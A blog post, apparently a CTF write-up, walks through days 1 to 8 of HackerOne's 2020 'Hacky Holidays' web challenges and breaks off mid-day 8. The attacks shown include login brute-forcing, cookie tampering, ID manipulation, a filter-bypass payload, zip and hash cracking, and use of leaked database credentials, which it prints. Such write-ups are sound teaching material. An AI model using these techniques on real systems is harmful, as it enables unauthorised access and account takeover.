<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hacky-Holidays. A Tale of Saving The Holidays" /><meta property="og:locale" content="en_US" /><meta name="description" content="Assalam-o-Alaikum &amp; Hello Folks!" /><meta property="og:description" content="Assalam-o-Alaikum &amp; Hello Folks!" /><link rel="canonical" href="https://thefawsec.github.io/posts/Hacky-Holidays-2020/" /><meta property="og:url" content="https://thefawsec.github.io/posts/Hacky-Holidays-2020/" /><meta property="og:site_name" content="theFawsec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-15T21:00:00+05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hacky-Holidays. A Tale of Saving The Holidays" /><meta name="twitter:site" content="@thefawsec" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Assalam-o-Alaikum &amp; Hello Folks!","url":"https://thefawsec.github.io/posts/Hacky-Holidays-2020/","@type":"BlogPosting","headline":"Hacky-Holidays. A Tale of Saving The Holidays","dateModified":"2021-04-12T18:14:21+05:00","datePublished":"2021-01-15T21:00:00+05:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://thefawsec.github.io/posts/Hacky-Holidays-2020/"},"@context":"https://schema.org"}</script><title>Hacky-Holidays. A Tale of Saving The Holidays | theFawsec</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatars/dp.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">theFawsec</a></div><div class="site-subtitle font-italic">A cyber security enthusiast & aspiring penetration tester, interested in red teaming.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/thefawsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/thefawsec" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['fawaz_masood','hotmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/fawaz-masood-qureshi" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hacky-Holidays. A Tale of Saving The Holidays</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hacky-Holidays. A Tale of Saving The Holidays</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Fawaz Masood Qureshi </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Jan 15, 2021, 9:00 PM +0500" prep="on" > Jan 15 <i class="unloaded">2021-01-15T21:00:00+05:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Apr 12, 2021, 6:14 PM +0500" prefix="Updated " > Apr 12 <i class="unloaded">2021-04-12T18:14:21+05:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6096 words">33 min</span></div></div><div class="post-content"><p><strong>Assalam-o-Alaikum &amp; Hello Folks!</strong></p><p>I hope you are doing well. Today I am here with the detailed writeup of a ctf organized by <a href="https://www.hackerone.com">Hackerone</a> which started in 2nd week of December 2020. It was a 12 days long CTF called <a href="https://www.hackerone.com/resources/hackerone/12-days-of-hacky-holidays-ctf">Hacky-Holiday</a>. There were total of 12 different challenges all focused on Web Applications. Each day a new challenge was available to solve.</p><p>Lets get started:</p><h1 id="day-01">Day 01</h1><h2 id="information-gathering">Information Gathering</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day1/day-01-1.png" alt="Day-01" /></p><ul><li>The main page did not had anything interesting.<li>I checked the source code, but found nothing useful.</ul><h2 id="hunting-the-flag">Hunting the flag</h2><ol><li>Out of ideas, I ran directory brutforce using dirsearch:<pre><code class="language-Bash"> dirsearch -u https://hackyholidays.h1ctf.com/ -e html,php
</code></pre><p>Found <strong><code class="language-plaintext highlighter-rouge">robots.txt</code></strong> file. That file disclosed the flag and the hint for next challenge. That was easy right?</p></ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day1/day-01-2.png#center" alt="IMAGE" /></p><hr /><h1 id="day-02">Day 02</h1><p>As I got the hint from the day 01 task, I visited the <strong>s3cr3t-ar3a</strong> page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day2/day-02-1.png" alt="IMAGE" /></p><h2 id="information-gathering-1">Information Gathering</h2><ul><li>As usual, when there is nothing much to interact with, first thing I do is to check the source code.<li>I noticed there was a div element having an id of <strong><code class="language-plaintext highlighter-rouge">alertbox</code></strong>, nothing interesting.<li><p>There was also a jquery file added to this html document.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day2/day-02-2.png" alt="IMAGE" /></p></ul><h2 id="hunting-the-flag-1">Hunting the flag</h2><ol><li>I opened that jquery file and started giving a birds eye view to it. There I found that <strong><code class="language-plaintext highlighter-rouge">alertbox</code></strong> id.</ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day2/day-02-3.png" alt="IMAGE" /></p><ol><li><p>If we look closely, there is an attribute <strong><code class="language-plaintext highlighter-rouge">data-info</code></strong>, some variables are being concatenated to it and these variables are defined just above.</p><li><p>If we evaluate that <strong>data-info</strong> attribute, the end result is the flag</p></ol><p><strong>NOTE:</strong> Reading this code, I also realized that if I had used developer tools (inspect element), the flag would have been there, so I did not need to read that jquery file for figuring out the flag.</p><hr /><h1 id="day-03---people-rater">Day 03 - People Rater</h1><h2 id="information-gathering-2">Information Gathering</h2><p>The application had a list of names, if we click the name, we get a pop up showing the rating of that person.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day3/day-03-1.png" alt="IMAGE" /></p><ul><li>At the main page we can see different people’e rating which is given by the evil grinch! Upon reading the source code I found some endpoints.</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day3/day-03-2.png" alt="IMAGE" /></p><ul><li>We can see two interesting endpoints here:<ul><li><code class="language-plaintext highlighter-rouge">/people-rater/entry?id=</code><li><code class="language-plaintext highlighter-rouge">/people-rater/page/</code>.</ul><p>we need to find the ids for the <code class="language-plaintext highlighter-rouge">/entry?id=</code> endpoint.</p><li>Reading the script shows that the <code class="language-plaintext highlighter-rouge">/people-rater/page/</code> has incremental integer values so visiting <code class="language-plaintext highlighter-rouge">/people-rater/page/1</code> give us the following content back:</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day3/day-03-3.png" alt="IMAGE" /></p><ul><li><p>If we enter any id from above response to the <code class="language-plaintext highlighter-rouge">/entry?id=</code> endpoint, we get a json response containing the name and rating of that person.</p><li><p>So we have the ids now, and also an endpoint which takes an id value in its <code class="language-plaintext highlighter-rouge">id</code> parameter.</p></ul><h2 id="hunting-the-flag-2">Hunting the flag</h2><ol><li><p>The id was not numeric, it was in some encoded form. I tried to see if I could decode the id value. It turned out the value was <strong>based64</strong> encoded.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day3/day-03-4.png" alt="IMAGE" /></p><li><p>So the first id was 2! But who has the id <strong><code class="language-plaintext highlighter-rouge">"1"</code></strong> then? I simply converted the <code class="language-plaintext highlighter-rouge">{"id":1}</code> value to base64 and visited the following endpoint: <code class="language-plaintext highlighter-rouge">/people-rater/entry?id=eyJpZCI6MX0=</code>. Note that the value <strong><code class="language-plaintext highlighter-rouge">eyJpZCI6MX0=</code></strong> is base64 encoding of <strong>{“id”:1}</strong></p></ol><p>In response, we can see the flag.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day3/day-03-5.png" alt="IMAGE" /></p><hr /><p># Day 04 - Swag shop</p><p>The task was to get the personal details of Grinch from an online shop. The shop had some swags, but to make a purchase, we need to login. I tried to find out but there was no register page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day4/day-04-1.png" alt="IMAGE" /></p><h2 id="information-gathering-3">Information Gathering</h2><ul><li><p>If we check the source code, we could see some Jquery code at the end.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day4/day-04-2.png" alt="IMAGE" /></p><li>This code disclosed some of the important endpoints which were:<ul><li><code class="language-plaintext highlighter-rouge">/api/stock</code><li><code class="language-plaintext highlighter-rouge">/api/login</code></ul><li>Knowing that, maybe there are more endpoints for this <code class="language-plaintext highlighter-rouge">/api</code> path, so we can do a simple directory fuzz and find out that there were two more endpoints:<ul><li><code class="language-plaintext highlighter-rouge">/api/user</code><li><code class="language-plaintext highlighter-rouge">/api/sessions</code></ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>  dirsearch -u https://hackyholidays.h1ctf.com/swag-shop/api/ -e php,html
  
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day4/day-04-3.png" alt="IMAGE" /></p><li><p>Visiting <code class="language-plaintext highlighter-rouge">/api/user</code> endpoint, we get an error in response saying: <strong>“Missing required fields”</strong>. So this endpoint requires some parameter(s),and we need to find those parameter(s).</p><li><p>I ran a tool <a href="https://github.com/s0md3v/Arjun">ARJUN</a> against this endpoint (Arjun is HTTP Parameter Discovery Suite) and it turns out the endpoint can have a <strong>uuid</strong> parameter.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day4/day-04-7.png" alt="IMAGE" /></p><li><p>Visiting the <code class="language-plaintext highlighter-rouge">/api/sessions</code> endpoint, we get an array of base64 encoded sessions in response.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day4/day-04-4.png" alt="IMAGE" /></p></ul><p>So we have an <code class="language-plaintext highlighter-rouge">/api/user</code> endpoint, which accepts an <code class="language-plaintext highlighter-rouge">uuid</code> parameter. We need to get some <code class="language-plaintext highlighter-rouge">uuids</code> to use the <code class="language-plaintext highlighter-rouge">/api/user?uuid=</code> endpoint. Also we have some base64 encoded sessions too.</p><h2 id="hunting-the-flag-3">Hunting the Flag</h2><ol><li><p>I decoding all the base64 sessions, and only one of them had some Id value in it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day4/day-04-6.png" alt="IMAGE" /></p><li><p>So I took that Id value and used in the <code class="language-plaintext highlighter-rouge">/api/user?uuid</code> endpoint. In response we get the flag!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre> https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043`
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day4/day-04-8.png" alt="IMAGE" /></p></ol><hr /><h1 id="day-05---secure-login">Day 05 - Secure Login</h1><p>The task was to find the flag by accessing the secret area. The main page had only a login form.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day5/day-05-1.png" alt="IMAGE" /></p><h2 id="information-gathering-4">Information Gathering</h2><ul><li>There was nothing important in source code nor did I found any useful directories.<li>If we try to enter some random username and password, the response is <span style="color:red"><strong>Invalid Username</strong></span>.<li>Such error are bad practise as they can be used to facilitate the enumeration process for username and passwords using bruteforce attack.<li>So using this error, we can determine when we enter a valid username (as when we will enter the valid username, we won’t get this error) and password.</ul><h2 id="hunting-the-flag-4">Hunting the flag</h2><ol><li>I sent the login request again, intercepted using burp suite &amp; sent the same request to intruder. Selected only the username field to enumerate(making the password field constant).<li><p>The attack type of Intruder was <strong>Sniper</strong>, I loaded a simple username wordlist from Seclist. In the <strong>Options</strong> tab, I added a <code class="language-plaintext highlighter-rouge">Grep-Match</code> rule of <strong>“Invalid Username”</strong>. This rule will help to identify the valid username.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day5/day-05-01.png" alt="IMAGE" /></p><li>Now start the attack. Thanks to the grep rule I added above, the valid username will have an unchecked box against it (because it does not have the <strong>Invalid Username</strong> in reponse, but <strong>Invalid Password</strong> because that specific username is correct).<li>Repeat same procedure for finding the password, in the intruder tab, enter the valid username that we just found, select password field to enumerate, then instead of using <strong>Invalid Username</strong> in Grep-Match, use <strong>Invalid password</strong>. Also use a password wordlist (I used SecList again)<li><p>The username and password found were <strong><code class="language-plaintext highlighter-rouge">acess</code></strong> &amp; <strong><code class="language-plaintext highlighter-rouge">computer</code></strong> respectively. After login, we can’t see anything useful yet.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day5/day-05-3.png" alt="IMAGE" /></p><li><p>Upon anaylzing the cookie, it turned out it is base64 encoded. It had an object <strong>admin</strong> with value of <strong>false</strong>. I Changed the false value to true, base64 encode the value again and then replaced the cookie.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day5/day-05-5.png" alt="IMAGE" /></p></ol><p>Now I had a zip file that can be downloaded.The file was password protected, so I used JTR (John The Ripper) to crack the password.</p><ol><li><p>For this, first I got the hash of the downloaded file (using zip2john) and stored it into a file and then used JTR to crack the hash.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> <span class="o">&gt;</span> zip2john my_secure_files_not_for_you.zip <span class="o">&gt;</span> zip-hash.txt

 <span class="o">&gt;</span> john zip-hash.txt 
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day5/day-05-7.png" alt="IMAGE" /></p></ol><p>The password was <code class="language-plaintext highlighter-rouge">hahahaha</code>. The zip file had a flag.txt file containing the flag. ___</p><h1 id="day-06---my-diary">Day 06 - My Diary</h1><p>The task was to hack the Grinch’s personal diary to find out his secret event.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day6/day-06-1.png" alt="IMAGE" /></p><h2 id="information-gathering-5">Information Gathering</h2><ul><li><p>If we see the main page, it has following url:</p><p><code class="language-plaintext highlighter-rouge">https://hackyholidays.h1ctf.com/my-diary/?template=entries.html</code></p><li><p>Whatever we enter after <code class="language-plaintext highlighter-rouge">/my-diary/</code>, it gets redirected to <code class="language-plaintext highlighter-rouge">?template=entries.html</code>.</p><li><p>A simple directory fuzz outputs a <code class="language-plaintext highlighter-rouge">/my-diary/index.php</code> file. Accessing the file simply redirect to the <code class="language-plaintext highlighter-rouge">?template=entries.html</code>.</p><li><p>In the url, Replaced the <strong>entries.html</strong> with <strong>index.php</strong> and we get a blank page. But checking the source code reveals some php code.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day6/day-06-2.png" alt="IMAGE" /></p></ul><h2 id="hunting-the-flag-5">Hunting the flag</h2><ol><li><p>The code says that there is <code class="language-plaintext highlighter-rouge">secretadmin.php</code> file. But there are some filters applied such that if the user input contains the word <code class="language-plaintext highlighter-rouge">admin.php</code> it gets converted to empty string. Then after that check, the code checks if the remaining input contains the word <code class="language-plaintext highlighter-rouge">secretadmin.php</code> and replaces it with empty string again.</p><p>So the task here was to enter such a payload that even afer the filters, the last output is <code class="language-plaintext highlighter-rouge">secretadmin.php</code>.</p><li><p>After a lots of tinkering and coming up with different payloads, the following payload worked in this scenario: <strong><code class="language-plaintext highlighter-rouge">secretadminsecretadminadmin.php.php.php</code></strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day6/day-06-3.png" alt="IMAGE" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day6/day-06-4.png" alt="IMAGE" /></p></ol><hr /><h1 id="day-07---hate-mail-generator">Day 07 - Hate Mail Generator</h1><h2 id="information-gathering-6">Information Gathering</h2><ul><li>The application has the functionality of:<ul><li>Creating new mails<ul><li>We can also preview the new mail before we can actually create it</ul><li><p>Viewing the existing mails</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day7/day-07-1.png" alt="IMAGE" /></p></ul><li>while reading the existing mail, we could see that <strong><code class="language-plaintext highlighter-rouge">template literals</code></strong> are being used in the Markup field.<li><p>It means when the code is being executed, the files referenced in that template literal will be loaded &amp; display the content it has (here we have <strong>cbdj3_grinch_header.html/footer.html</strong>)</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day7/day-07-2.png" alt="IMAGE" /></p><li><p>Simple directory fuzzing reveals the <code class="language-plaintext highlighter-rouge">templates</code> directory which contains all the available templates, including one which belongs to Admin! Directly accessing the files returns an error that we can’t access them directly.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day7/day-07-3.png" alt="IMAGE" /></p><li><p>On the create new mail page, if we click the preview button before creating the mail, we get the following content in response always (irrespective of what we enter in any input field):</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day7/day-07-4.png" alt="IMAGE" /></p><p><strong>Interesting!</strong></p></ul><h2 id="hunting-the-flag-6">Hunting the flag</h2><ol><li><p>Upon checking the source code of this page (create new mail), I found that there are two hidden elements. One with the value of <code class="language-plaintext highlighter-rouge">Hello </code> and the second with the value of <code class="language-plaintext highlighter-rouge">{"name": "Alice", "email": "alice@test.com"}</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day7/day-07-5.png" alt="IMAGE" /></p><li><p>So the name object from second element is getting placed in the first element by using template literal. I simply changed the value of <code class="language-plaintext highlighter-rouge">"name"</code> object to <code class="language-plaintext highlighter-rouge">"38dhs_admins_only_header.html"</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day7/day-07-6.png" alt="IMAGE" /></p></ol><p>In the response, I got the flag.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day7/day-07-7.png" alt="IMAGE" /></p><hr /><h1 id="day-08---forum">Day 08 - Forum</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day8/day-08-1.png" alt="IMAGE" /></p><p>The task was to read the admin posts which are only visible to admins. There is a login function, but no way to register an account.</p><h2 id="information-gathering-7">Information Gathering</h2><ul><li>The app was quite simple as we can only read the public posts.<ul><li>Though those posts shows that there are at least two users already in the application namely <strong><code class="language-plaintext highlighter-rouge">grinch</code></strong> (probably the admin) and <strong><code class="language-plaintext highlighter-rouge">max</code></strong>.</ul><li><p>Directory fuzzing revealed that there was a directory named: <code class="language-plaintext highlighter-rouge">phpmyadmin</code>. I tried some common/default username &amp; password combinations but were of no use.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day8/day-08-2.png" alt="IMAGE" /></p></ul><h2 id="hunting-the-flag-7">Hunting the flag</h2><ol><li><p>Quite confused at this point, I started checking what other people are taking about this challenge, there was a hint that said <code class="language-plaintext highlighter-rouge">Its on the Internet!</code></p><li>A simple google search <code class="language-plaintext highlighter-rouge">Grinch Networks github</code> and I can see Adam Langley’s github profile (Creator of this CTF). There I found the source code for this <strong>Forum</strong>’ Application. At first, there was nothing important in the latest commit, so I tried to read the initial commits.<li><p>In the second commit, the file <code class="language-plaintext highlighter-rouge">db.php</code> had the username and password for that phpmyadmin client!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day8/day-08-3.png" alt="IMAGE" /></p><li><p>Logged in into phpmyadmin client using <strong>username:<code class="language-plaintext highlighter-rouge">forum</code></strong> &amp; <strong>password:<code class="language-plaintext highlighter-rouge">6HgeAZ0qC9T6CQIqJpD</code></strong>. There we can only access the users table which had the username, password (hashed) and whether the user is admin or not.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day8/day-08-4.png" alt="IMAGE" /></p><li>I took the password hash, and used <a href="https://crackstation.net/">CrackStaion</a> to crack the password. The password was <strong><code class="language-plaintext highlighter-rouge">BahHumbug</code></strong>.<ul><li>I tried quite a lot other online services but nothing worked for me.<li>I even tried using JTR with rockyou.txt wordlist but even that did not cracked the password.</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/posts/hackyholiday2020/day8/day-08-5.png" alt="IMAGE" /></p><li><p>Used the username <code class="language-plaintext highlighter-rouge">grinch</code> and password <code class="language-plaintext highlighter-rouge">BahHumbug</code> to login to the main forum application.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 